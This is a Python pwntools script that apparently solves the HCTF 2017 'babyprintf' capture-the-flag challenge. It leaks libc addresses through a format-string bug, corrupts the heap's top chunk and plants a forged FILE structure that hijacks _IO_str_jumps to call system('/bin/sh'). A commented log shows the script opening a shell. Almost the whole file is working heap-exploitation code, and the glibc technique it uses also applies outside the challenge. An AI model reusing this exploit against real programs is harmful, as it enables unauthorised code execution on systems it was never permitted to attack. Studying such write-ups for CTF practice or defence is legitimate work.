#!/usr/bin python
from pwn import *
import sys

debug = 0
if len(sys.argv) > 1:
	debug = 1

def one_loop(size, string):
	p.sendlineafter("size: ", str(size))
	p.sendlineafter("string: ", string)
	p.recvuntil("result: ")

p = process("./babyprintf")
#first leaking libc
payload = "%p%p%p%p%p%p%p%p%p%p%p%p"
payload = payload.ljust(0x28, 'a') + p64(0xd81)
one_loop(0x20, payload)

data = p.recvuntil("1c1")
leak_addr = int(data[-14:], 16)
print "[+] leak address: " + hex(leak_addr)
libc_addr = leak_addr - (0x210d0 + 241)
print "[+] libc address: " + hex(libc_addr)
io_list_all = libc_addr + 0x3db620
print '[+] IO_list_all: ' + hex(io_list_all)
system_addr = libc_addr + 0x47dc0
print '[+] system address: ' + hex(system_addr)
io_str_jumps = libc_addr + 0x3D74A0
print "[+] IO_str_jumps: " + hex(io_str_jumps)
binsh_addr = libc_addr + 0x1A3F20
print "[+] binsh address: " + hex(binsh_addr)

#making top chunk added into unsorted bin
one_loop(0x1000, 'fuckyou')
payload = 'b'*0x20
'''
v5=[fp+0x38]
v6=[fp+0x40]-v5
v7=2*v6+100
v6<=v7
call [fp+0xe0](arg: v7)
'''
fake_file = p64(0) + p64(0x61) + p64(0xdeadbeef) + p64(io_list_all-0x10)
fake_file += p64(0xffffffffffffff) + p64(0)*3 + p64((binsh_addr-100)/2)
fake_file = fake_file.ljust(0xa0, "\x00")
fake_file += p64(libc_addr+8) #_IO_wide_data
fake_file = fake_file.ljust(0xc0, '\x00')
fake_file += p64(1) #_mode
fake_file = fake_file.ljust(0xd8, '\x00')
fake_file += p64(io_str_jumps)
fake_file += p64(system_addr)
payload += fake_file

one_loop(0x20, payload)
if debug:
	gdb.attach(p)
p.sendlineafter("size: ", '32')

p.interactive()
'''
->  Desktop python babyprintf.py 
[+] Starting local process './babyprintf': pid 9971
[+] leak address: 0x7f5ea85181c1
[+] libc address: 0x7f5ea84f7000
[+] IO_list_all: 0x7f5ea88d2620
[+] system address: 0x7f5ea853edc0
[+] IO_str_jumps: 0x7f5ea88ce4a0
[+] binsh address: 0x7f5ea869af20
[*] Switching to interactive mode
*** Error in `./babyprintf': malloc(): memory corruption: 0x00007f5ea88d2620 ***
$ whoami
w0lfzhang

'''
'''
links
https://code.woboq.org/userspace/glibc/libio/strops.c.html#_IO_str_overflow
https://code.woboq.org/userspace/glibc/libio/genops.c.html#_IO_flush_all_lockp
http://simp1e.leanote.com/post/Hctf-2017-babyprintf
https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
'''